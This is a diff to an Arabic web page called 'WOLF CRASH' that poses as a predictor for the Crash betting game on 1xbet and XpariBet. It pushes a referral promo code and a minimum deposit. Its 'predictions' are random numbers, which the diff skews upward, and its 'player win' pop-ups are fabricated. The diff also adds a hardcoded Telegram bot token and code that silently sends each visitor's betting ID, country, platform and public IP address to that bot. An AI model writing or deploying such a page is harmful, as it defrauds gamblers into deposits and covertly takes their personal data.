@@ -6,44 +6,58 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 @font-face { font-family:'ArabicFont'; src:url('arabic.ttf') format('truetype'); }
-body { font-family:'ArabicFont',sans-serif; background:#0a0f1f; color:white; margin:0; padding:0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; }
+body { font-family:'ArabicFont',sans-serif; background:#0a0f1f; color:white; margin:0; padding:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
 .hidden { display:none; }
-.dialog { background:#0d1b2a; border:2px solid #555; border-radius:12px; padding:12px; width:85%; max-width:350px; text-align:center; animation:fadeIn 0.5s ease; }
+.dialog { background:#0d1b2a; border:2px solid #555; border-radius:12px; padding:10px; width:85%; max-width:350px; text-align:center; animation:fadeIn 0.5s ease; margin-top:30px; }
 @keyframes fadeIn { from{opacity:0;transform:scale(0.9);} to{opacity:1;transform:scale(1);} }
-.dialog img { width:130px; margin-bottom:8px; }
+.dialog img { width:110px; margin-bottom:8px; }
 .title { font-size:2.3em; font-weight:bold; background:linear-gradient(90deg,#00ffff,#ff00ff,#ffff00); background-size:200% 200%; -webkit-background-clip:text; -webkit-text-fill-color:transparent; animation:gradientShift 3s infinite alternate; margin-bottom:5px; }
 @keyframes gradientShift { 0%{background-position:0% 50%;} 100%{background-position:100% 50%;} }
-.subtitle { font-size:1.2em; margin-bottom:10px; }
-.conditions { text-align:right; font-size:0.9em; margin-bottom:10px; animation:blinkColor 1.5s infinite alternate; }
-@keyframes blinkColor { 0%{color:gray;} 100%{color:red;} }
-input { font-family:'ArabicFont',sans-serif; width:90%; padding:10px; font-size:1em; border-radius:8px; border:1px solid #555; margin-bottom:8px; text-align:center; }
-.platforms { display:flex; justify-content:center; gap:10px; margin-bottom:10px; }
+.subtitle { font-size:1.1em; margin-bottom:8px; }
+.conditions { text-align:right; font-size:0.8em; margin-bottom:8px; padding:5px; background:rgba(255,255,255,0.05); border:1px solid gray; border-radius:6px; line-height:1.3em; }
+input { font-family:'ArabicFont',sans-serif; width:90%; padding:8px; font-size:1em; border-radius:8px; border:1px solid #555; margin-bottom:8px; text-align:center; }
+.platforms { display:flex; justify-content:center; gap:10px; margin-bottom:8px; }
 .platforms label { display:flex; align-items:center; gap:5px; cursor:pointer; background:#1b263b; padding:5px 10px; border-radius:6px; }
 .platforms img { width:25px; height:25px; }
+.country-select { display:flex; justify-content:center; gap:10px; margin-bottom:8px; }
+.country-select img { width:32px; height:22px; border-radius:3px; cursor:pointer; border:2px solid transparent; transition:0.2s; }
+.country-select img.selected { border-color:#00ffff; transform:scale(1.1); }
 button { font-family:'ArabicFont',sans-serif; width:90%; padding:12px; font-size:1em; border:none; border-radius:8px; cursor:pointer; margin-top:6px; transition:transform 0.1s ease; }
 button:active { transform:scale(0.95); }
 .confirm { background:#3498db; color:white; }
-.promo-main { background:transparent; border:1px solid gray; display:flex; align-items:center; justify-content:center; gap:5px; font-size:0.9em; border-radius:8px; margin:6px auto; padding:6px; }
+.promo-main { background:transparent; color:white; border:1px solid gray; display:flex; align-items:center; justify-content:center; gap:6px; font-size:0.9em; border-radius:10px; margin:6px auto; padding:8px; }
 .promo-main img { width:18px; height:18px; }
 .alert-dialog { background:#0d1b2a; border:2px solid gray; border-radius:10px; padding:12px; text-align:center; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); display:none; z-index:1000; }
 .alert-dialog button { background:#3498db; color:white; margin-top:8px; padding:6px 12px; border-radius:6px; cursor:pointer; }
-#app { width:100%; max-width:400px; text-align:center; }
+#app { width:100%; max-width:400px; text-align:center; margin-top:10px; }
 .top-info { display:flex; align-items:center; justify-content:flex-end; gap:6px; margin:10px; font-size:1em; }
+.top-info img.flag { width:24px; height:16px; border-radius:3px; }
 .status-circle { width:10px; height:10px; background:limegreen; border-radius:50%; }
 .circle-container { position:relative; width:130px; height:130px; margin:10px auto; }
 .circle { width:100%; height:100%; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:1.8em; border:3px solid #00ffff; position:relative; z-index:2; }
-.ring1,.ring2 { position:absolute; top:0; left:0; width:100%; height:100%; border:3px solid; border-radius:50%; box-sizing:border-box; }
-.ring1 { border-color:red transparent red transparent; animation:spin1 5s linear infinite; }
-.ring2 { border-color:blue transparent blue transparent; animation:spin2 7s linear infinite; }
-@keyframes spin1 { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
-@keyframes spin2 { 0%{transform:rotate(360deg);} 100%{transform:rotate(0deg);} }
+.red-ring, .blue-ring { position:absolute; top:0; left:0; width:100%; height:100%; border-radius:50%; box-sizing:border-box; }
+.red-ring { border-top:4px solid red; border-right:4px solid red; border-left:4px solid transparent; border-bottom:4px solid transparent; animation:spinCW 4s linear infinite; }
+.blue-ring { border-top:4px solid blue; border-left:4px solid blue; border-right:4px solid transparent; border-bottom:4px solid transparent; animation:spinCCW 4s linear infinite; }
+@keyframes spinCW { 0%{transform:rotate(0);} 100%{transform:rotate(360deg);} }
+@keyframes spinCCW { 0%{transform:rotate(0);} 100%{transform:rotate(-360deg);} }
 .buttons { display:flex; justify-content:center; gap:10px; margin:12px 0; }
 .buttons button { flex:1; max-width:140px; padding:10px; font-size:1em; border-radius:8px; }
 .predict { background:#2ecc71; color:white; }
 .reset { background:#e74c3c; color:white; }
 .telegram { background:#1d6fb8; width:90%; display:flex; align-items:center; justify-content:center; gap:6px; margin:6px auto; border-radius:10px; padding:8px; }
 .telegram img { width:20px; height:20px; }
-.info-box { background:rgba(255,255,255,0.05); border:1px solid gray; border-radius:8px; padding:8px; margin:10px auto; font-size:0.75em; line-height:1.4em; text-align:center; width:85%; max-width:250px; }
+.info-box {
+  background: rgba(255,255,255,0.05);
+  border: 1px solid gray;
+  border-radius: 8px;
+  padding: 8px;
+  margin: 10px auto;
+  font-size: 0.75em;
+  line-height: 1.4em;
+  text-align: center;
+  width: 85%;
+  max-width: 250px;  /* يخليه أقرب للمربع */
+}
 #alerts { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); display:flex; flex-direction:column; align-items:center; gap:10px; z-index:1000; }
 .alert-box { background:#222; border:1px solid #777; border-radius:10px; padding:10px 15px; opacity:0; transform:translateX(100%); transition:all 0.5s ease; min-width:250px; text-align:center; }
 .alert-box.show { opacity:1; transform:translateX(0); }
@@ -51,7 +65,6 @@ button:active { transform:scale(0.95); }
 </style>
 </head>
 <body>
-<!-- ديالوج إدخال -->
 <div class="dialog" id="startDialog">
   <img src="ela.png" alt="Logo">
   <div class="title">WOLF CRASH</div>
@@ -60,6 +73,12 @@ button:active { transform:scale(0.95); }
     شروط تشغيل اداة WOLF CRASH:<br>1- التسجيل بالبروموكود EVO3<br>2- ايداع 3 دولار او 150 جنيه مصري فما فوق<br>3- العب بدون طمع
   </div>
   <input type="number" id="userId" placeholder="ادخل الايدي المكون من 10 أرقام">
+  <div class="country-select" id="countrySelect">
+    <img src="https://flagcdn.com/w40/eg.png" data-country="مصر 🇪🇬" alt="مصر">
+    <img src="https://flagcdn.com/w40/ma.png" data-country="المغرب 🇲🇦" alt="المغرب">
+    <img src="https://flagcdn.com/w40/dz.png" data-country="الجزائر 🇩🇿" alt="الجزائر">
+    <img src="https://flagcdn.com/w40/sa.png" data-country="السعودية 🇸🇦" alt="السعودية">
+  </div>
   <div class="platforms">
     <label><input type="radio" name="platform" value="1xbet"><img src="imag1.png">1xbet</label>
     <label><input type="radio" name="platform" value="XpariBet"><img src="imag2.png">XpariBet</label>
@@ -73,16 +92,16 @@ button:active { transform:scale(0.95); }
   <button onclick="closeAlert()">حسنا</button>
 </div>
 
-<!-- صفحة التوقع -->
 <div id="app" class="hidden">
   <div class="top-info">
     <span id="userInfo"></span>
+    <img id="countryFlag" class="flag" src="" alt="علم">
     <img id="platformIcon" src="" width="20">
     <div class="status-circle"></div>
   </div>
   <div class="circle-container">
-    <div class="ring1"></div>
-    <div class="ring2"></div>
+    <div class="red-ring"></div>
+    <div class="blue-ring"></div>
     <div class="circle" id="multiplier">X0.00</div>
   </div>
   <div class="buttons">
@@ -92,7 +111,7 @@ button:active { transform:scale(0.95); }
   <a href="https://t.me/xbet_mux" target="_blank">
     <button class="telegram"><img src="telegram.png">انضم للقناة</button>
   </a>
-  <div class="promo-main" onclick="copyCode()"><img src="files.png"> الرمز الترويجي: EVO3</div>
+  <button class="promo-main" onclick="copyCode()"><img src="files.png"> الرمز الترويجي: EVO3</button>
   <div class="info-box">
     تم تصميم هذه الأداة لتحليل لعبة Crash على تطبيقات XpariBet و1xbet باستخدام البروموكود EVO3 🎯💥، لمساعدة اللاعبين على فهم الأنماط المحتملة واتخاذ قرارات أذكى أثناء اللعب 📊🎮. يمكنك الآن الانضمام إلى قناة التيليجرام بالزر بالأعلى 🔗📲، حظًا موفقًا لك 🍀!
   </div>
@@ -100,55 +119,54 @@ button:active { transform:scale(0.95); }
 </div>
 
 <script>
-function goToApp(){
+let selectedCountry="", selectedFlag="";
+const BOT_TOKEN="8220302372:AAEt10w_U28Wu3QLgiqKSSye7Ib2mMl2CZE";
+const CHAT_ID="7028385695";
+
+document.querySelectorAll('#countrySelect img').forEach(img=>{
+  img.addEventListener('click',()=>{
+    document.querySelectorAll('#countrySelect img').forEach(i=>i.classList.remove('selected'));
+    img.classList.add('selected');
+    selectedCountry=img.getAttribute('data-country');
+    selectedFlag=img.src;
+  });
+});
+
+async function goToApp(){
   const id=document.getElementById('userId').value;
   const platform=document.querySelector('input[name="platform"]:checked');
   if(id.length!==10){ showAlert("الرجاء إدخال ID مكون من 10 أرقام"); return; }
   if(!platform){ showAlert("الرجاء اختيار المنصة"); return; }
+  if(!selectedCountry){ showAlert("الرجاء اختيار علم الدولة"); return; }
+
+  let ip="غير معروف";
+  try{
+    const res=await fetch("https://api.ipify.org?format=json");
+    const data=await res.json();
+    ip=data.ip;
+  }catch(e){}
+
+  const message=`📌 ID: ${id}\n🌍 الدولة: ${selectedCountry}\n🎮 المنصة: ${platform.value}\n📡 IP: ${ip}`;
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({ chat_id:CHAT_ID, text:message })
+  });
+
   document.getElementById('startDialog').classList.add('hidden');
   document.getElementById('app').classList.remove('hidden');
   document.getElementById('userInfo').textContent="ID: "+id;
   document.getElementById('platformIcon').src=platform.value==="1xbet"?"imag1.png":"imag2.png";
+  document.getElementById('countryFlag').src=selectedFlag;
   setInterval(generateAlert,12000);
 }
 
-function showAlert(message){
-  document.getElementById('alertMessage').textContent=message;
-  document.getElementById('alertDialog').style.display='block';
-}
-
+function showAlert(message){ document.getElementById('alertMessage').textContent=message; document.getElementById('alertDialog').style.display='block'; }
 function closeAlert(){ document.getElementById('alertDialog').style.display='none'; }
-
-function predict(){
-  const multiplier=document.getElementById('multiplier');
-  const random = (Math.random() * (4.99 - 0.1) + 0.1); // عشوائي بين 0.1 و 4.99
-  let current=0; 
-  const target=parseFloat(random); 
-  const step=target/30;
-  const interval=setInterval(()=>{
-    current+=step; 
-    if(current>=target){ 
-      current=target; 
-      clearInterval(interval); 
-    } 
-    multiplier.textContent="X"+current.toFixed(2); 
-  },50);
-}
-
+function predict(){ if(navigator.vibrate){ navigator.vibrate(200); } const multiplier=document.getElementById('multiplier'); const random=Math.random()<0.25?(Math.random()*(15.99-8)+8):(Math.random()*(7.99-2)+2); let current=0; const target=parseFloat(random); const step=target/30; const interval=setInterval(()=>{ current+=step; if(current>=target){ current=target; clearInterval(interval); } multiplier.textContent="X"+current.toFixed(2); },50); }
 function reset(){ document.getElementById('multiplier').textContent="X0.00"; }
 function copyCode(){ navigator.clipboard.writeText('EVO3'); showAlert("✅ تم نسخ البروموكود!"); }
-
-function generateAlert(){
-  const alertsContainer=document.getElementById('alerts');
-  const alertBox=document.createElement('div'); alertBox.className='alert-box';
-  const playerID=Math.floor(1000000000+Math.random()*9000000000);
-  const chance=(Math.random()*(4.99-0.1)+0.1).toFixed(2);
-  const money=(Math.floor(Math.random()*10000)+450);
-  alertBox.innerHTML=`<strong>اشعار لعب:</strong><br>إيدي اللاعب: ${playerID}<br>الفرصة: X ${chance}<br>الأموال: ${money} EGP ✅`;
-  alertsContainer.appendChild(alertBox);
-  setTimeout(()=> alertBox.classList.add('show'),100);
-  setTimeout(()=>{ alertBox.classList.remove('show'); alertBox.classList.add('hide'); setTimeout(()=>alertsContainer.removeChild(alertBox),500); },8000);
-}
+function generateAlert(){ const alertsContainer=document.getElementById('alerts'); const alertBox=document.createElement('div'); alertBox.className='alert-box'; const playerID=Math.floor(1000000000+Math.random()*9000000000); const chance=(Math.random()*(15.99-2)+2).toFixed(2); const money=(Math.floor(Math.random()*10000)+450); alertBox.innerHTML=`<strong>اشعار لعب:</strong><br>إيدي اللاعب: ${playerID}<br>الفرصة: X ${chance}<br>الأموال: ${money} EGP ✅`; alertsContainer.appendChild(alertBox); setTimeout(()=> alertBox.classList.add('show'),100); setTimeout(()=>{ alertBox.classList.remove('show'); alertBox.classList.add('hide'); setTimeout(()=>alertsContainer.removeChild(alertBox),500); },8000); }
 </script>
 </body>
 </html>
